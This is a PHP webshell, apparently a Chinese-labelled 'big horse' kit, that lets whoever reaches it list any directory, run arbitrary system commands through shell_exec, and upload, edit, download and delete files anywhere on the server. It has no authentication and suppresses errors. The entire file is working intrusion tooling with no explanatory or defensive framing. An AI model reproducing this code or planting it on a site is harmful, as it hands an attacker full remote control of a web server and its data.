<?php
/**
 * 大马：文件管理 + 命令执行 + 上传 + 编辑
 */
error_reporting(0);
set_time_limit(0);

session_start();

class BigShell
{
    public $dir;

    public function __construct()
    {
        $this->dir = isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'] : getcwd());
        $this->dir = rtrim($this->dir, '/\\');
    }

    public function run()
    {
        $act = isset($_GET['a']) ? $_GET['a'] : 'list';
        switch ($act) {
            case 'cmd':
                $this->cmd();
                break;
            case 'upload':
                $this->upload();
                break;
            case 'edit':
                $this->edit();
                break;
            case 'delete':
                $this->delete();
                break;
            case 'download':
                $this->download();
                break;
            case 'mkdir':
                $this->mkdir();
                break;
            default:
                $this->listing();
        }
    }

    public function listing()
    {
        $path = $this->dir;
        if (!is_dir($path)) {
            $path = getcwd();
        }
        echo '<h3>File Manager: ' . htmlspecialchars($path) . '</h3>';
        echo '<p><a href="?a=list&d=' . urlencode(dirname($path)) . '">..</a></p>';

        $items = @scandir($path);
        if (!$items) {
            echo '<p>Cannot list directory.</p>';
            return;
        }

        echo '<table border="1" cellpadding="4" style="border-collapse:collapse">';
        echo '<tr><th>Name</th><th>Size</th><th>Perms</th><th>Mtime</th><th>Actions</th></tr>';
        foreach ($items as $name) {
            if ($name === '.') {
                continue;
            }
            $full = $path . DIRECTORY_SEPARATOR . $name;
            $isDir = is_dir($full);
            $size = $isDir ? '-' : @filesize($full);
            $perm = @substr(sprintf('%o', @fileperms($full)), -4);
            $mtime = @date('Y-m-d H:i', @filemtime($full));
            $link = '?a=list&d=' . urlencode($full);
            echo '<tr>';
            echo '<td><a href="' . $link . '">' . htmlspecialchars($name) . ($isDir ? '/' : '') . '</a></td>';
            echo '<td>' . $size . '</td>';
            echo '<td>' . $perm . '</td>';
            echo '<td>' . $mtime . '</td>';
            echo '<td>';
            if (!$isDir) {
                echo '<a href="?a=edit&f=' . urlencode($full) . '">edit</a> | ';
                echo '<a href="?a=download&f=' . urlencode($full) . '">get</a> | ';
            }
            echo '<a href="?a=delete&f=' . urlencode($full) . '" onclick="return confirm(\'Delete?\')">del</a>';
            echo '</td>';
            echo '</tr>';
        }
        echo '</table>';
        echo '<hr>';
        echo '<form method="post" action="?a=upload&d=' . urlencode($path) . '" enctype="multipart/form-data">';
        echo '<input type="file" name="f"><input type="submit" value="upload"></form>';
        echo '<form method="post" action="?a=mkdir&d=' . urlencode($path) . '">';
        echo '<input type="text" name="name" placeholder="new dir"><input type="submit" value="mkdir"></form>';
        echo '<form method="get"><input type="hidden" name="a" value="list">';
        echo '<input type="text" name="d" value="' . htmlspecialchars($path) . '" size="60">';
        echo '<input type="submit" value="go"></form>';
    }

    public function cmd()
    {
        echo '<h3>Command</h3>';
        if (!empty($_POST['cmd'])) {
            echo '<pre>';
            echo htmlspecialchars(shell_exec($_POST['cmd']));
            echo '</pre>';
        }
        echo '<form method="post" action="?a=cmd">';
        echo '<input type="text" name="cmd" size="60"><input type="submit" value="run"></form>';
    }

    public function upload()
    {
        if (!empty($_FILES['f']['tmp_name'])) {
            $target = $this->dir . DIRECTORY_SEPARATOR . basename($_FILES['f']['name']);
            @move_uploaded_file($_FILES['f']['tmp_name'], $target);
        }
        header('Location: ?a=list&d=' . urlencode($this->dir));
    }

    public function edit()
    {
        $file = isset($_GET['f']) ? $_GET['f'] : '';
        if (!$file || !is_file($file)) {
            echo 'No file.';
            return;
        }
        if (!empty($_POST['content'])) {
            @file_put_contents($file, $_POST['content']);
        }
        echo '<h3>Edit: ' . htmlspecialchars($file) . '</h3>';
        echo '<form method="post"><textarea name="content" rows="20" cols="100">';
        echo htmlspecialchars((string)@file_get_contents($file));
        echo '</textarea><br><input type="submit" value="save"></form>';
    }

    public function delete()
    {
        $file = isset($_GET['f']) ? $_GET['f'] : '';
        if ($file && is_file($file)) {
            @unlink($file);
        }
        header('Location: ?a=list&d=' . urlencode(dirname($file)));
    }

    public function download()
    {
        $file = isset($_GET['f']) ? $_GET['f'] : '';
        if ($file && is_file($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            readfile($file);
        }
        exit;
    }

    public function mkdir()
    {
        $name = !empty($_POST['name']) ? basename($_POST['name']) : '';
        if ($name) {
            @mkdir($this->dir . DIRECTORY_SEPARATOR . $name, 0777, true);
        }
        header('Location: ?a=list&d=' . urlencode($this->dir));
    }
}

$sh = new BigShell();
$sh->run();
